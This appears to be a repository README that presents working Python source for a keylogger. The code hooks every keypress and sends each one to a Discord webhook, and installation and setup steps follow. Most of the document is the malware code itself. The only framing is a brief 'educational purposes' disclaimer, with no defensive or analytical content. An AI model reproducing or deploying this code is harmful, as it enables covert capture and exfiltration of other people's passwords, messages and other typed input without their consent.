# Keylogger
**Simple keylogger who sends the information throught Discord webhooks. Only made for educational purposes!**
**I am not responsible for any damages caused by improper use of the code** 
## Code 

```python
from pynput.keyboard import Listener
from discord_webhook import DiscordWebhook, DiscordEmbed

hook = "" #In "" put ur discord webhook

def writefile(key): 
    try:
        letter = str(key)
        webhook = DiscordWebhook(url=hook, content=letter)
        response = webhook.execute()
    except KeyError:
        pass

with Listener(on_press=writefile) as lis:
    lis.join()
``` 
## How to use 
First download python to your PC 
Next use command download pynput and discord_webhook
Command:
```python
pip install discord_webhook
pip install pynput
```
Go to code and change "hook" to your discord bot webhook 

## Appearance
![](https://i.imgur.com/0kiEY8i.png)
